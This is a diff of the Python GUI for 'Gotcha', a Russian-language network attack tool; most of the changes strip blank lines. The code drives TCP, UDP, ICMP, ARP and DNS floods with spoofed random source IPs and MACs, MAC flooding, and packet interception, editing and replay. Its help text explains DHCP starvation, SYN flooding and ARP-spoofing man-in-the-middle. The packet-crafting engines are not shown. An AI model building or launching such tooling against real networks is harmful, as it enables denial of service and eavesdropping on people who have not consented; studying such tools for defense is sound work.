         self.mac_external_thread.start()
-
         self.mac_stats = {'start_time': time.time(), 'sent_frames': 0}
         self.status_var.set("MAC flood started")
-
     def stop_mac_flood(self):
         if not self.mac_attack_running:
             return
@@ -2032,35 +1663,25 @@ class Gotcha:
         self.mac_start_btn.config(state='normal')
         self.mac_stop_btn.config(state='disabled')
         self.status_var.set("MAC flood stopped")
-
     def on_mac_finished(self):
         self.mac_attack_running = False
         self.mac_start_btn.config(state='normal')
         self.mac_stop_btn.config(state='disabled')
-
-                                         
     def setup_custom_attack_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
-        
         left_frame = ttk.Frame(main_frame)
         left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
-        
         right_frame = ttk.Frame(main_frame)
         right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
-        
         params_frame = ttk.LabelFrame(left_frame, text="Параметры DoS атаки")
         params_frame.pack(fill='x', padx=5, pady=5)
-        
-                    
         row1 = ttk.Frame(params_frame)
         row1.pack(fill='x', padx=5, pady=5)
         ttk.Label(row1, text="IP адрес:", width=12).pack(side='left', padx=2)
         self.custom_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
         self.custom_ip.pack(side='left', padx=2)
         self.custom_ip.insert(0, "192.168.1.1")
-        
-                  
         row2 = ttk.Frame(params_frame)
         row2.pack(fill='x', padx=5, pady=5)
         ttk.Label(row2, text="Протокол:", width=12).pack(side='left', padx=2)
@@ -2070,16 +1691,12 @@ class Gotcha:
         self.custom_protocol.pack(side='left', padx=2)
         self.custom_protocol.set("TCP")
         self.custom_protocol.bind('<<ComboboxSelected>>', self.on_protocol_change)
-        
-                                                     
         self.custom_port_frame = ttk.Frame(params_frame)
         self.custom_port_frame.pack(fill='x', padx=5, pady=5)
         ttk.Label(self.custom_port_frame, text="Порт:", width=12).pack(side='left', padx=2)
         self.custom_port = ttk.Entry(self.custom_port_frame, width=10, font=('Arial', 9))
         self.custom_port.pack(side='left', padx=2)
         self.custom_port.insert(0, "80")
-        
-                       
         row4 = ttk.Frame(params_frame)
         row4.pack(fill='x', padx=5, pady=5)
         ttk.Label(row4, text="Размер пакета:", width=12).pack(side='left', padx=2)
@@ -2087,8 +1704,6 @@ class Gotcha:
         self.custom_packet_size.pack(side='left', padx=2)
         self.custom_packet_size.insert(0, "1024")
         ttk.Label(row4, text="байт").pack(side='left', padx=2)
-        
-                     
         row5 = ttk.Frame(params_frame)
         row5.pack(fill='x', padx=5, pady=5)
         ttk.Label(row5, text="Время (сек):", width=12).pack(side='left', padx=2)
@@ -2096,8 +1711,6 @@ class Gotcha:
         self.custom_packet_count.pack(side='left', padx=2)
         self.custom_packet_count.insert(0, "60")
         ttk.Label(row5, text="0 = бесконечно").pack(side='left', padx=6)
-        
-                                                           
         self.custom_options_frame = ttk.Frame(params_frame)
         self.custom_random_ip = tk.BooleanVar(value=False)
         self.custom_random_mac = tk.BooleanVar(value=False)
@@ -2105,58 +1718,41 @@ class Gotcha:
         ttk.Checkbutton(self.custom_options_frame, text="Случайный MAC", variable=self.custom_random_mac).pack(side='left', padx=5)
         self.custom_options_frame.pack(fill='x', padx=5, pady=5)
         self.custom_options_frame.pack_forget()                    
-        
-                   
         self.custom_row7 = ttk.Frame(params_frame)
         self.custom_row7.pack(fill='x', padx=5, pady=5)
         ttk.Label(self.custom_row7, text="Интерфейс:", width=12).pack(side='left', padx=2)
         self.custom_interface = ttk.Combobox(self.custom_row7, width=25, font=('Arial', 9), values=self.network_interfaces)
         self.custom_interface.pack(side='left', padx=2)
         self.custom_interface.set(self.active_interface)
-        
-                
         button_frame = ttk.Frame(params_frame)
         button_frame.pack(fill='x', padx=5, pady=10)
-        
         self.custom_start_btn = ttk.Button(button_frame, text="Начать DoS атаку", 
                                          command=self.start_custom_attack, width=15)
         self.custom_start_btn.pack(side='left', padx=5)
-        
         self.custom_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                         command=self.stop_custom_attack, width=15, state='disabled')
         self.custom_stop_btn.pack(side='left', padx=5)
-        
-                    
         stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
         stats_frame.pack(fill='x', padx=5, pady=5)
-        
         stats_grid = ttk.Frame(stats_frame)
         stats_grid.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
         self.custom_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.custom_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
         self.custom_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
         self.custom_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
-        
         ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
         self.custom_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
         self.custom_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
-        
-             
         log_frame = ttk.LabelFrame(right_frame, text="Лог DoS атаки")
         log_frame.pack(fill='both', expand=True, padx=5, pady=5)
-        
         self.custom_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
         self.custom_log.pack(fill='both', expand=True, padx=5, pady=5)
-        
         btn_frame = ttk.Frame(log_frame)
         btn_frame.pack(fill='x', padx=5, pady=5)
         ttk.Button(btn_frame, text="Сохранить лог", 
                   command=lambda: self.save_log(self.custom_log), width=14).pack()
-        
         self.custom_attack_stats = {
             'start_time': 0,
             'sent_packets': 0,
@@ -2165,26 +1761,18 @@ class Gotcha:
             'last_sent': 0,
             'total_bytes': 0
         }
-        
-                                       
         self.on_protocol_change()
-    
     def on_protocol_change(self, event=None):
         proto = self.custom_protocol.get()
-        
-                                           
         if proto in ["TCP", "UDP"]:
             self.custom_port_frame.pack(fill='x', padx=5, pady=5, before=self.custom_options_frame
                                         if self.custom_options_frame.winfo_ismapped() else self.custom_row7)
         else:
             self.custom_port_frame.pack_forget()
-        
-                                                                       
         if proto in ["TCP", "ARP", "ICMP"]:
             self.custom_options_frame.pack(fill='x', padx=5, pady=5, before=self.custom_row7)
         else:
             self.custom_options_frame.pack_forget()
-    
     def run_external_tool(self, args, log_widget, stop_event, process_key, infinite=False, on_finish=None, stats_callback=None):
         try:
             if platform.system() == "Windows":
@@ -2207,7 +1795,6 @@ class Gotcha:
                     bufsize=1
                 )
             self.external_processes[process_key] = (proc, stop_event)
-
             for line in iter(proc.stdout.readline, ''):
                 line = line.strip()
                 if not line:
@@ -2228,7 +1815,6 @@ class Gotcha:
                 except json.JSONDecodeError:
                     log_widget.insert('end', line + '\n')
                     log_widget.see('end')
-
                 if stop_event.is_set():
                     if infinite and proc.poll() is None:
                         try:
@@ -2239,7 +1825,6 @@ class Gotcha:
                     else:
                         proc.terminate()
                     break
-
             proc.wait()
         except Exception as e:
             log_widget.insert('end', f"External process error: {str(e)}\n")
@@ -2248,15 +1833,12 @@ class Gotcha:
             log_widget.insert('end', "External process finished.\n")
             if on_finish:
                 self.root.after(0, on_finish)
-    
     def start_custom_attack(self):
         if self.custom_attack_running:
             return
-            
         self.custom_attack_running = True
         self.custom_start_btn.config(state='disabled')
         self.custom_stop_btn.config(state='normal')
-        
         try:
             target_ip = self.custom_ip.get()
             protocol = self.custom_protocol.get()
@@ -2267,22 +1849,16 @@ class Gotcha:
             interface = self.custom_interface.get()
             random_ip = self.custom_random_ip.get()
             random_mac = self.custom_random_mac.get()
-
             if duration < 0:
                 raise ValueError("Время атаки не может быть отрицательным")
-            
-                                 
             self.current_attack_type = protocol
             self.external_infinite = continuous and protocol in ["TCP", "ARP", "ICMP"]
-            
-                                                          
             self.custom_log.delete(1.0, tk.END)
             self.custom_log.insert('end', f"{protocol} flood started\n")
             self.custom_log.insert('end', f"Target: {target_ip}" + (f":{port}" if protocol in ["TCP","UDP"] else "") + "\n")
             self.custom_log.insert('end', f"Interface: {interface}\n")
             if protocol in ["TCP", "ARP", "ICMP"]:
                 self.custom_log.insert('end', f"Random IP: {'yes' if random_ip else 'no'}, Random MAC: {'yes' if random_mac else 'no'}\n")
-            
             if protocol == "UDP":
                 self.raw_attack.start_udp_attack(
                     target_ip, port, packet_size, duration, 
@@ -2372,8 +1948,6 @@ class Gotcha:
                     target_ip, duration, continuous, interface, self._log_custom,
                     on_complete=lambda: self.root.after(0, self.on_internal_finished)
                 )
-            
-                                                                 
             if protocol in ["UDP", "DNS"]:
                 self.custom_attack_stats = {
                     'start_time': time.time(),
@@ -2384,24 +1958,19 @@ class Gotcha:
                     'total_bytes': 0
                 }
                 self.update_custom_attack_stats()
-            
             self.status_var.set(f"DoS атака запущена: {protocol} → {target_ip}")
-            
         except ValueError as e:
             messagebox.showerror("Ошибка", f"Некорректные параметры:\n{str(e)}")
             self.stop_custom_attack()
         except Exception as e:
             messagebox.showerror("Ошибка", f"Не удалось запустить атаку:\n{str(e)}")
             self.stop_custom_attack()
-
     def _log_custom(self, message):
         self.custom_log.insert('end', f"{message}\n")
         self.custom_log.see('end')
-
     def _show_internal_results(self, final_stats):
         if not final_stats:
             return
-
         total_packets = final_stats['total_sent']
         total_bytes = final_stats['total_bytes']
         total_time = time.time() - final_stats['start_time']
@@ -2413,11 +1982,9 @@ class Gotcha:
         self.custom_log.insert('end', f"Total data: {total_bytes} bytes\n")
         if total_time > 0:
             self.custom_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
-
     def on_internal_finished(self):
         if not self.custom_attack_running or self.current_attack_type not in ["UDP", "DNS"]:
             return
-
         final_stats = None
         if self.current_attack_type == "UDP":
             with self.raw_attack.stats_lock:
@@ -2425,7 +1992,6 @@ class Gotcha:
         elif self.current_attack_type == "DNS":
             with self.scapy_attack.stats_lock:
                 final_stats = self.scapy_attack.stats.copy()
-
         self._show_internal_results(final_stats)
         self.custom_attack_running = False
         self.custom_start_btn.config(state='normal')
@@ -2433,18 +1999,14 @@ class Gotcha:
         self.status_var.set("DoS атака завершена")
         self.current_attack_type = None
         self.external_infinite = False
-    
     def on_external_finished(self):
         self.custom_attack_running = False
         self.custom_start_btn.config(state='normal')
         self.custom_stop_btn.config(state='disabled')
         self.status_var.set("DoS атака завершена")
-    
     def stop_custom_attack(self):
         if not self.custom_attack_running:
             return
-
-                                                  
         if self.current_attack_type in ["TCP", "ARP", "ICMP"]:
             key = self.current_attack_type.lower()
             proc_info = self.external_processes.get(key)
@@ -2462,8 +2024,6 @@ class Gotcha:
                         proc.wait(timeout=1)
                     except subprocess.TimeoutExpired:
                         proc.kill()
-
-                                                                              
         if self.current_attack_type in ["UDP", "DNS"]:
             if self.raw_attack.running:
                 final_stats = self.raw_attack.stop()
@@ -2472,19 +2032,15 @@ class Gotcha:
             else:
                 final_stats = None
             self._show_internal_results(final_stats)
-
-                          
         self.custom_attack_running = False
         self.custom_start_btn.config(state='normal')
         self.custom_stop_btn.config(state='disabled')
         self.status_var.set("DoS атака остановлена")
         self.current_attack_type = None
         self.external_infinite = False
-    
     def update_custom_attack_stats(self):
         if not self.custom_attack_running:
             return
-            
         current_time = time.time()
         if self.raw_attack.running:
             with self.raw_attack.stats_lock:
@@ -2496,40 +2052,29 @@ class Gotcha:
                 sent_packets = self.scapy_attack.stats['total_sent']
         else:
             sent_packets = 0
-        
         self.custom_sent.config(text=f"{sent_packets}")
-        
         duration = current_time - self.custom_attack_stats['start_time']
         hours = int(duration // 3600)
         minutes = int((duration % 3600) // 60)
         seconds = int(duration % 60)
         self.custom_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
-        
         if self.custom_attack_running:
             self.root.after(1000, self.update_custom_attack_stats)
-
-                                      
     def setup_intercept_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
-        
         left_frame = ttk.Frame(main_frame)
         left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
-        
         right_frame = ttk.Frame(main_frame)
         right_frame.pack(side='right', fill='y', padx=5, pady=5)
-        
         params_frame = ttk.LabelFrame(left_frame, text="Параметры перехвата")
         params_frame.pack(fill='x', padx=5, pady=5)
-        
         row1 = ttk.Frame(params_frame)
         row1.pack(fill='x', padx=4, pady=3)
-        
         ttk.Label(row1, text="Интерфейс:").pack(side='left', padx=2)
         self.intercept_interface = ttk.Combobox(row1, width=15, font=('Arial', 9), values=self.network_interfaces)
         self.intercept_interface.pack(side='left', padx=2)
         self.intercept_interface.set(self.active_interface)
-        
         ttk.Label(row1, text="Фильтр:").pack(side='left', padx=8)
         self.intercept_filter = ttk.Combobox(row1, width=18, font=('Arial', 9), values=[
             "icmp or tcp", "tcp", "udp", "icmp", "arp", "not arp", "not stp", 
@@ -2537,46 +2082,35 @@ class Gotcha:
         ])
         self.intercept_filter.pack(side='left', padx=2)
         self.intercept_filter.set("")
-        
         row2 = ttk.Frame(params_frame)
         row2.pack(fill='x', padx=4, pady=3)
-        
         ttk.Label(row2, text="Кол-во ответов:").pack(side='left', padx=2)
         self.intercept_response_count = ttk.Entry(row2, width=8, font=('Arial', 9))
         self.intercept_response_count.pack(side='left', padx=2)
         self.intercept_response_count.insert(0, "0")
-        
         ttk.Label(row2, text="Кол-во для отпр.:").pack(side='left', padx=10)
         self.send_count = ttk.Entry(row2, width=8, font=('Arial', 9))
         self.send_count.pack(side='left', padx=2)
         self.send_count.insert(0, "10")
-        
         button_frame = ttk.Frame(params_frame)
         button_frame.pack(fill='x', padx=4, pady=6)
-        
         self.intercept_start_btn = ttk.Button(button_frame, text="Начать перехват", 
                                         command=self.start_packet_intercept, width=14)
         self.intercept_start_btn.pack(side='left', padx=2)
-        
         self.intercept_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                        command=self.stop_packet_intercept, width=12, state='disabled')
         self.intercept_stop_btn.pack(side='left', padx=2)
-        
         ttk.Button(button_frame, text="Захватить выбранный", 
               command=self.capture_selected_intercept_packet, width=18).pack(side='left', padx=2)
         ttk.Button(button_frame, text="Редактировать", 
               command=self.edit_selected_intercept_packet, width=13).pack(side='left', padx=1)
-        
         packets_frame = ttk.LabelFrame(left_frame, text="Перехваченные пакеты")
         packets_frame.pack(fill='both', expand=True, padx=5, pady=5)
-        
         columns = ("№", "Время", "Источник", "Назначение", "Протокол", "Длина", "Информация")
         self.intercept_tree = ttk.Treeview(packets_frame, columns=columns, show='headings', height=12)
-        
         for col in columns:
             self.intercept_tree.heading(col, text=col)
             self.intercept_tree.column(col, width=90)
-        
         self.intercept_tree.column("№", width=40)
         self.intercept_tree.column("Время", width=80)
         self.intercept_tree.column("Источник", width=120)
@@ -2584,49 +2118,35 @@ class Gotcha:
         self.intercept_tree.column("Протокол", width=70)
         self.intercept_tree.column("Длина", width=50)
         self.intercept_tree.column("Информация", width=150)
-        
         tree_scroll = ttk.Scrollbar(packets_frame, orient="vertical", command=self.intercept_tree.yview)
         self.intercept_tree.configure(yscrollcommand=tree_scroll.set)
-        
         self.intercept_tree.pack(side='left', fill='both', expand=True)
         tree_scroll.pack(side='right', fill='y')
-        
         control_frame = ttk.LabelFrame(right_frame, text="Управление пакетами")
         control_frame.pack(fill='x', padx=5, pady=5)
-        
         info_frame = ttk.LabelFrame(control_frame, text="Текущие пакеты")
         info_frame.pack(fill='x', padx=5, pady=5)
-        
         ttk.Label(info_frame, text="Захваченный:").pack(anchor='w', pady=1)
         self.captured_packet_info = ttk.Label(info_frame, text="Нет", wraplength=300)
         self.captured_packet_info.pack(anchor='w', pady=1, fill='x')
-        
         ttk.Label(info_frame, text="Отредактированный:").pack(anchor='w', pady=1)
         self.edited_packet_info = ttk.Label(info_frame, text="Нет", wraplength=300)
         self.edited_packet_info.pack(anchor='w', pady=1, fill='x')
-        
         send_frame = ttk.Frame(control_frame)
         send_frame.pack(fill='x', padx=5, pady=8)
-        
         ttk.Button(send_frame, text="Отправить захваченный", 
               command=self.send_captured_packet, width=20).pack(pady=2)
         ttk.Button(send_frame, text="Отправить отредактированный", 
               command=self.send_edited_packet, width=20).pack(pady=2)
-        
         ttk.Button(control_frame, text="Очистить список", 
               command=self.clear_intercept_list, width=20).pack(pady=5)
-        
         log_frame = ttk.LabelFrame(right_frame, text="Лог перехвата")
         log_frame.pack(fill='both', expand=True, padx=5, pady=5)
-        
         self.intercept_log = scrolledtext.ScrolledText(log_frame, height=20, wrap=tk.WORD, font=('Consolas', 8))
         self.intercept_log.pack(fill='both', expand=True, padx=5, pady=5)
-        
         ttk.Button(log_frame, text="Сохранить лог", 
               command=lambda: self.save_log(self.intercept_log), width=14).pack(pady=4)
-        
         self.intercept_tree.bind('<<TreeviewSelect>>', self.on_intercept_packet_select)
-
     def on_intercept_packet_select(self, event):
         selection = self.intercept_tree.selection()
         if not selection:
@@ -2644,7 +2164,6 @@ class Gotcha:
             self.intercept_log.insert('end', f"Длина: {packet_info[5]} байт\n")
             self.intercept_log.insert('end', f"Информация: {packet_info[6]}\n")
             self.intercept_log.see('end')
-
     def capture_selected_intercept_packet(self):
         if not self.selected_packet:
             messagebox.showwarning("Предупреждение", "Сначала выберите пакет")
@@ -2652,7 +2171,6 @@ class Gotcha:
         self.captured_packet = self.selected_packet
         self.captured_packet_info.config(text=f"Захвачен: {self.selected_packet.summary()}")
         self.intercept_log.insert('end', f"\nПакет захвачен: {self.selected_packet.summary()}\n")
-
     def edit_selected_intercept_packet(self):
         if not self.selected_packet:
             messagebox.showwarning("Предупреждение", "Сначала выберите пакет")
@@ -2663,7 +2181,6 @@ class Gotcha:
                 self.edited_packet_info.config(text=f"Отредактирован: {edited_packet.summary()}")
                 self.intercept_log.insert('end', f"\nПакет сохранён: {edited_packet.summary()}\n")
         Editor(self.root, self.selected_packet, callback)
-
     def send_captured_packet(self):
         if self.captured_packet is None:
             self.intercept_log.insert('end', "Нет захваченного пакета для отправки!\n")
@@ -2676,7 +2193,6 @@ class Gotcha:
             self.intercept_log.insert('end', f"Отправлено {count} копий захваченного пакета\n")
         except Exception as e:
             self.intercept_log.insert('end', f"Ошибка отправки: {str(e)}\n")
-
     def send_edited_packet(self):
         if self.edited_packet is None:
             self.intercept_log.insert('end', "Нет отредактированного пакета для отправки!\n")
@@ -2689,13 +2205,11 @@ class Gotcha:
             self.intercept_log.insert('end', f"Отправлено {count} копий отредактированного пакета\n")
         except Exception as e:
             self.intercept_log.insert('end', f"Ошибка отправки: {str(e)}\n")
-
     def clear_intercept_list(self):
         for item in self.intercept_tree.get_children():
             self.intercept_tree.delete(item)
         self.intercept_packets.clear()
         self.intercept_log.insert('end', "Список пакетов очищен\n")
-
     def add_packet_to_intercept_tree(self, packet_data):
         packet_num, current_time, src, dst, protocol, length, info, packet = packet_data
         self.intercept_packets.append(packet)
@@ -2703,7 +2217,6 @@ class Gotcha:
         if len(self.intercept_tree.get_children()) > 1000:
             self.intercept_tree.delete(self.intercept_tree.get_children()[0])
             self.intercept_packets.pop(0)
-
     def start_packet_intercept(self):
         self.packet_intercept_running = True
         self.intercept_start_btn.config(state='disabled')
@@ -2716,14 +2229,12 @@ class Gotcha:
         self.intercept_thread.start()
         self.intercept_log.insert('end', "Перехват пакетов запущен\n")
         self.status_var.set("Перехват запущен")
-
     def stop_packet_intercept(self):
         self.packet_intercept_running = False
         self.intercept_start_btn.config(state='normal')
         self.intercept_stop_btn.config(state='disabled')
         self.intercept_log.insert('end', "Перехват остановлен\n")
         self.status_var.set("Перехват остановлен")
-
     def get_packet_info(self, packet):
         src = "Unknown"
         dst = "Unknown"
@@ -2750,7 +2261,6 @@ class Gotcha:
             protocol = "ARP"
             info = f"Operation: {packet[ARP].op}"
         return (src, dst, protocol, length, info)
-
     def intercept_worker(self, filter_str, interface):
         def intercept_handler(packet):
             if not self.packet_intercept_running:
@@ -2778,7 +2288,6 @@ class Gotcha:
                   stop_filter=lambda x: not self.packet_intercept_running)
         except Exception as e:
             self.intercept_log.insert('end', f"Ошибка сниффинга: {str(e)}\n")
-
     def create_response_packet(self, original_packet):
         try:
             if original_packet.haslayer(ICMP) and original_packet[ICMP].type == 8:
@@ -2799,25 +2308,18 @@ class Gotcha:
         except Exception as e:
             self.intercept_log.insert('end', f"Ошибка создания ответа: {str(e)}\n")
         return None
-
-                              
     def setup_settings_tab(self, parent):
         main_frame = ttk.Frame(parent)
         main_frame.pack(fill='both', expand=True, padx=8, pady=8)
-        
         theme_frame = ttk.LabelFrame(main_frame, text="Настройки темы")
         theme_frame.pack(fill='x', padx=5, pady=5)
-        
         ttk.Button(theme_frame, text="Светлая тема", 
                   command=lambda: self.theme_manager.apply_theme("light"), width=12).pack(side='left', padx=4, pady=4)
         ttk.Button(theme_frame, text="Тёмная тема", 
                   command=lambda: self.theme_manager.apply_theme("dark"), width=12).pack(side='left', padx=4, pady=4)
-        
         help_frame = ttk.LabelFrame(main_frame, text="Справка")
         help_frame.pack(fill='both', expand=True, padx=5, pady=5)
-        
         ttk.Button(help_frame, text="Открыть справку", command=self.show_help, width=22).pack(padx=8, pady=8)
-
     def save_log(self, text_widget):
         filename = filedialog.asksaveasfilename(
             defaultextension=".txt",
@@ -2830,7 +2332,6 @@ class Gotcha:
                 self.status_var.set("Лог сохранён")
             except Exception as e:
                 messagebox.showerror("Ошибка", f"Не удалось сохранить файл: {str(e)}")
-
     def show_help(self):
         help_window = tk.Toplevel(self.root)
         help_window.title("Справка")
@@ -2843,13 +2344,10 @@ class Gotcha:
             pass
         help_notebook = ttk.Notebook(help_window)
         help_notebook.pack(fill='both', expand=True, padx=15, pady=15)
-        
         general_frame = ttk.Frame(help_notebook)
         help_notebook.add(general_frame, text="Общая информация")
         general_text = """Gotcha – Инструмент для тестирования сетевой безопасности
-
 https://github.com/hedromanie
-
 ТРЕБОВАНИЯ:
 • Права администратора
 • Windows 10 21h2+ или Linux (с адаптацией)
@@ -2867,11 +2365,9 @@ Start-Service RemoteAccess
         general_txt.pack(fill='both', expand=True, padx=10, pady=10)
         general_txt.insert('1.0', general_text)
         general_txt.config(state='disabled')
-        
         bpf_frame = ttk.Frame(help_notebook)
         help_notebook.add(bpf_frame, text="BPF фильтры")
         bpf_text = """ПРИМЕРЫ BPF ФИЛЬТРОВ:
-
 ОСНОВНЫЕ ПРИМИТИВЫ:
    host <ip>          – трафик с/на IP (host 192.168.1.1)
    net <сеть>         – трафик в сети (net 192.168.1.0/24)
@@ -2880,16 +2376,13 @@ Start-Service RemoteAccess
    ether host <mac>   – кадры с указанным MAC
    ether broadcast    – широковещательные кадры
    ip, ip6, arp, tcp, udp, icmp – протоколы
-
 НАПРАВЛЕНИЕ:
    src <примитив>     – только от источника
    dst <примитив>     – только к назначению
-
 ЛОГИЧЕСКИЕ ОПЕРАТОРЫ:
    and, && – И
    or, ||  – ИЛИ
    not, !  – НЕ
-
 ПРИМЕРЫ (с пояснениями):
    1. tcp port 80 – только TCP-пакеты с портом 80 (HTTP)
    2. udp port 53 – только DNS-запросы/ответы
@@ -2905,14 +2398,12 @@ Start-Service RemoteAccess
    12. vlan – все пакеты с тегом VLAN (можно уточнить vlan 100)
    13. greater 500 – пакеты длиннее 500 байт
    14. less 64 – короткие пакеты (<64 байт)
-
 Примечание: фильтры нечувствительны к регистру;
 Фильтры могут быть самыми разными не только теми, что указаны здесь"""
         bpf_txt = scrolledtext.ScrolledText(bpf_frame, wrap=tk.WORD, font=('Consolas', 9))
         bpf_txt.pack(fill='both', expand=True, padx=10, pady=10)
         bpf_txt.insert('1.0', bpf_text)
         bpf_txt.config(state='disabled')
-
         attacks_frame = ttk.Frame(help_notebook)
         help_notebook.add(attacks_frame, text="Описание атак")
         attacks_text = """АТАКИ:
@@ -2925,14 +2416,12 @@ Start-Service RemoteAccess
      повторно.
    • Применяется для анализа трафика, тестирования сетевых устройств,
      изучения протоколов.
-
 2. DHCP STARVATION (ИСЩЕНИЕ ПУЛА DHCP)
    • Атака по принципу DORA с уникальными MAC-адресами.
    • DHCP-сервер вынужден резервировать IP-адреса для каждого запроса,
      что приводит к исчерпанию пула доступных адресов.
    • Легитимные клиенты не могут получить IP.
    • Используется для проверки устойчивости DHCP-сервера.
-
 3. DoS АТАКИ (ФЛУД)
    Поддерживаются протоколы: TCP, UDP, ICMP, ARP, DNS.
    • TCP SYN flood – отправка TCP-пакетов с флагом SYN, инициирующих
@@ -2946,14 +2435,12 @@ Start-Service RemoteAccess
      его ресурсы.
    • Для TCP, ARP, ICMP доступны опции случайного IP и MAC-адреса источника
      (имитация распределённой атаки).
-
 4. ARP SPOOFING (ПОДМЕНА ARP)
    • Атака типа «человек посередине» на канальном уровне.
    • Отправляет поддельные ARP-ответы, убеждая целевое устройство и шлюз,
      что MAC-адрес атакующего принадлежит другому узлу.
    • Весь трафик между целью и шлюзом проходит через атакующего.
    • Возможно восстановление ARP после остановки и включение IP forwarding.
-
 5. MAC FLOOD
    • Отправляет огромное количество Ethernet-кадров с минимальным размером
      и случайными MAC-адресами источника.
@@ -2964,7 +2451,6 @@ Start-Service RemoteAccess
         attacks_txt.pack(fill='both', expand=True, padx=10, pady=10)
         attacks_txt.insert('1.0', attacks_text)
         attacks_txt.config(state='disabled')
-        
         access_frame = ttk.Frame(help_notebook)
         help_notebook.add(access_frame, text="Доступ и диагностика")
         access_text = """ФУНКЦИИ ВКЛАДКИ "ДОСТУП":
@@ -2972,27 +2458,22 @@ Start-Service RemoteAccess
    • Отправляет 4 ICMP Echo Request (ping) на указанный IP-адрес.
    • Использует системную утилиту ping, вывод отображается в логе.
    • Позволяет проверить доступность узла и измерить время отклика.
-
 2. Port Scan
    • Сканирует наиболее распространённые TCP-порты (21,22,23,25,53,80,110,143,443,993,995,3389).
    • Для каждого порта выполняется попытка установить TCP-соединение.
    • Результат: список открытых портов.
-
 3. Traceroute
    • Выполняет трассировку маршрута до указанного узла.
    • На Windows использует tracert с параметрами -d -h 30 -w 1000.
    • На Linux — traceroute -n -m 30 -w 1.
    • Показывает промежуточные узлы и задержки.
-
 4. Таблица маршрутизации
    • Выводит IPv4 таблицу маршрутизации (аналог route print).
    • Отфильтровывает IPv6 строки для удобства чтения.
    • Полезна для диагностики сетевых настроек.
-
 5. Сетевые адаптеры
    • Показывает все доступные сетевые интерфейсы (имена, IP-адреса, MAC-адреса).
    • Использует библиотеку scapy для получения информации.
-
 6. Сканировать сеть
    • Выполняет ARP-сканирование локальной сети /24 (на основе введённого IP).
    • Отправляет ARP-запросы на все адреса подсети.
@@ -3002,21 +2483,16 @@ Start-Service RemoteAccess
         access_txt.pack(fill='both', expand=True, padx=10, pady=10)
         access_txt.insert('1.0', access_text)
         access_txt.config(state='disabled')
-        
         close_btn = ttk.Button(help_window, text="Закрыть", command=help_window.destroy)
         close_btn.pack(pady=10)
         self.theme_manager.apply_to_widgets(help_window, self.theme_manager.themes[self.theme_manager.current_theme])
-    
-                         
     def generate_random_mac(self):
         return "%02x:%02x:%02x:%02x:%02x:%02x" % (
             random.randint(0, 255), random.randint(0, 255),
             random.randint(0, 255), random.randint(0, 255),
             random.randint(0, 255), random.randint(0, 255)
         )
-    
     def on_closing(self):
-                                          
         if self.custom_attack_running:
             self.stop_custom_attack()
         if self.dhcp_attack_running:
@@ -3027,7 +2503,6 @@ Start-Service RemoteAccess
             self.stop_packet_intercept()
         if self.mac_attack_running:
             self.stop_mac_flood()
-                                                                     
         for key, (proc, stop_event) in list(self.external_processes.items()):
             stop_event.set()
             if proc.poll() is None:
@@ -3038,7 +2513,6 @@ Start-Service RemoteAccess
                     proc.kill()
         self.system_monitor_running = False
         self.root.destroy()
-
 def check_admin():
     if platform.system() == "Windows":
         try:
@@ -3046,7 +2520,6 @@ def check_admin():
         except:
             return False
     return True
-
 def main():
     if platform.system() == "Windows" and not check_admin():
         messagebox.showerror("Требуются права администратора", 
@@ -3056,11 +2529,9 @@ def main():
         except:
             pass
         return
-    
     root = tk.Tk()
     app = Gotcha(root)
     root.protocol("WM_DELETE_WINDOW", app.on_closing)
     root.mainloop()
-
 if __name__ == "__main__":
     main()
